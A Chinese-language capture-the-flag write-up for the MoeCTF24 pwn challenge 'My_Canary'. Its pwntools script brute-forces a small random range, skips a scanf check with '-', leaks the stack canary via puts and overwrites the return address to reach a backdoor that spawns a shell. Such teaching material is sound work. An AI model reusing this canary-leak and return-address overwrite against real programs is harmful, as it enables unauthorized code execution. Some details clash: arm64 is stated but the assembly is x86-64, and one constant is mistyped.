# MoeCTF24 My_Canary Writeup

## 1.提供的文件的浅显信息：
1. ELF,arm64_little,linux,partial Relro
2. 编译保护信息：NX enable,No PIE,Canary found
3. 根据名字canary，大概猜测是关于Stack_Canary的题
  
## 2.根据反汇编代码观察所得信息：
1. 存在后门函数：用GDB，IAD可以反汇编得出以下代码,由于没有用PIE，先记录一下它的地址： 
```
    + Dump of assembler code for function unreachable:
    0x00000000004012a8 <+0>:     endbr64
    0x00000000004012ac <+4>:     push   rbp
    0x00000000004012ad <+5>:     mov    rbp,rsp
```

下面是反编译代码:
```
    int unreachable(){
    write(1, "Why does the canary remain silent...\n", 0x25uLL);
    return system("/bin/sh");
    }
```

2. 既然是一个canary命名的题，那么应该有栈保护，如果还没有了解什么是canary,可以看看CTF Handbook上对于canary的描述。我们这里简单说明一下栈结构和canary的关系。
```
    [ buf (0x20字节)        ]  ← 变量区
    [ canary (8 字节)       ]  ← 安全检查用
    [ saved rbp (8 字节)    ]  ← 栈基指针
    [ return address (8 字节) ] ← 函数返回地址
```
所以我们如果要使用之前unreachable的地址进行ROP（Return-Oriented Programming），必须要绕过canary对栈的保护机制。先来找找canary的地址在哪？
<!-- ![IDA_Stack_info](https://img2024.cnblogs.com/blog/3460580/202504/3460580-20250420105045796-307255303.png) -->
![img](https://img2024.cnblogs.com/blog/3460580/202504/3460580-20250420105045796-307255303.png)


可以发现buf是距离rbp最近的变量，它的大小是24B，根据其地址0020h-0018=0008h那么var_8就是我们要找的canary.也可以注意到这个canary就是我们反编译代码中的v12.
```
    unsigned __int64 v12; // [rsp+48h] [rbp-8h]
    v12 = __readfsqword(0x28u);
```

1. 除了这些重要信息，我们还要理清这个程序流程：
    1. 有一个输入随机数猜测的循环：这个输入对象，由gdb看RX可以看出目标是v6
    ``` 
            v8 = (unsigned int)arc4random(argc, 0LL, v4) % 0x2345 + 16768186;
            while ( (unsigned int)__isoc99_scanf() == -1 || v8 != v6 )
            write(1, "[Error] Wrong! Try again.\n", 0x1AuLL);
    ```
    大家可以设置断点来快速定位scanf在反汇编代码的位置
    ``` 
    0x0000000000401444 <+230>:   call   0x401110 <write@plt>
    0x0000000000401449 <+235>:   lea    rax,[rbp-0x4c]
    0x000000000040144d <+239>:   mov    rsi,rax
    0x0000000000401450 <+242>:   lea    rax,[rip+0xc3b]        # 0x402092
    0x0000000000401457 <+249>:   mov    rdi,rax
    0x000000000040145a <+252>:   mov    eax,0x0
    => 0x000000000040145f <+257>:   call   0x401180 <__isoc99_scanf@plt> 
    ```


    2. 有一个对于v9输入三次的循环，有两个对于v9，v10数据进行特殊值要求的判断
    ```
    cage_bak = v9[0];
    for ( i = 0; i <= 2; ++i ){
        __isoc99_scanf();
        if ( !v9[i] )
        break;
    }
    if ( v10 != 195874819 ){
        write(1, "[FATAL] Canary under attack. Shutting down...\n", 0x2EuLL);
        _exit(1);
        }
        if ( v9[0] != cage_bak ){
        write(1, "[FATAL] Hacker!\n", 0x10uLL);
        _exit(1);
    }
    ``` 

    3. 通过以上后，尝试对buf进行写入，注意buf的大小是24，但是它提供的read(0,buf,0x30ull);说明给了48Bytes的缓存,不过具体写多少其实还是由我们编写exploit.py时决定（不超过缓存大小）。
    ```
    read(0, buf, 0x30uLL);
    puts(buf);
    read(0, buf, 0x30uLL);    
    ``` 
     
## 3.开始尝试对这行关卡进行跳过：
1. 输入一个随机数由于这个随机数的范围已经给出了，并且0x2345这个数不到10000，只需要简单的暴力遍历就可以找到：
```
    v8 =  16768186 # 0xffabcd
    p.sendlineafter('ed.\n',str(v8).encode()) # 先触发一下错误
    for i in range(0x2345):
        payload = v8 + i
        p.sendlineafter(b'n.\n',str(payload).encode())
        # 如果匹配到了，就退出
        ret = p.recvuntil(b'] ')
        if 'Error' not in ret.decode():
            print('find it: ',payload)
            break
```

2. 第二个判断是有三个写入，它希望我们保持v9[0]不变，但是它是个随机数，我们很难知道它的值，v9[1]没有要求，v10要求值变为19587481。现在的难点在于我们要怎么输入这个v9[0]？这似乎只能输入它所需的值才可以呢，或者说是输入没有改变v9[0]。
根据题目提示，我们应该尝试跳过scanf而不是对其进行输入。怎么跳过呢？其实就是要表示数字的正负值的'+'和'-'可以将scanf对于%d的输入进行跳过，因为这两个符号只是告诉scanf输入的数据的类型，当知道只一点后，scanf就只是等待数字的输入。
```
    # 尝试跳过v9[0],v9[1]随意
    p.sendlineafter(b't.\n',b'-')
    p.sendline(b'1')

    # 在跳过v9[0,1]后，开始覆写v9[2]即v10（可以观察stack对于v10内存的分配）
    payload = 195874819
    p.sendline(str(payload).encode())
```

3. 第三个使用Read进行ROP的操作：难点：怎么在不改变canary的方法来进行ROP？
    值得注意的是，它给了我们两次read()，这似乎不是很符合我们一贯的习惯，我们也不会说对于同一个对象写两次一样的输入会有什么特别。
    But,it' s worth noting,它们之间有一个puts(),hhh，这是摆明了让我们尝试回显canary。然后根据这个值做出第二轮输入。那么我们就可以设计以下代码：
```
    unreachable = 0x4012ad # 0x4012a8并非正常指令，要调到mov 语句  

    # 由于它使用了read函数，且设置的fd是0，所以是standard input
    # 这里我们可以某些值使得buffer的值溢出到返回地址，同时返回地址写入后门函数的地址

    p.send(cyclic(25))  
    # 第一次写入25B，最后1B是为了回显canary，但是又不会改变Canary后续的内容。

    p.recvuntil(b'g')   # cyclic的3字符轮换到25就是'g'
    canary = b'\x00' + p.recvn(7) # 读取canary，

    # ROP： buff + canary + rbp + ret
    p.send(cyclic(24) + canary + cyclic(8)+p64(unreachable))

    p.interactive()  # 这个可恶的interactive()一定不要忘了写，我之前忘记了一直在调代码，回头一看忘记写了……
```

    

## 4. 为什么它会有这个漏洞？Vulnerable?
1. 使用了canary，但是提供了回显Canary的方法，警惕在靠近Canary的变量的IO行为。
2. 使用的scanf存在可跳过的操作，即使随机数和加密使得要知道v9[0]的值几乎不可能，但是可以绕过检测也是一种success。
3. 使用的随机数的空间太小，0x2345不到10000，可枚举。


## 5. 个人的错误（脑子瓦特了，当乐子看看就行）：
1. 尝试将v6写到v8，使二者指相等，但是实际上这里使用%d输入的话不会对后续进行溢出，不过如果是%s又不一样了，如果v8的地址比v6的地址低，那么就可以尝试覆写v8。如果有兴趣可以看看我这篇关于变量之间覆写的测试随笔。    
![](https://img2024.cnblogs.com/blog/3460580/202504/3460580-20250420221733499-497443898.png)
![](https://img2024.cnblogs.com/blog/3460580/202504/3460580-20250420221702591-403955880.png)


2. 写脚本时发现捣鼓半天才发现没有写interactive来接收shell，孩子这辈子也是有了。


### 以上就是所有个人见解了，如果有任何错误请务必指出讨论，谢谢。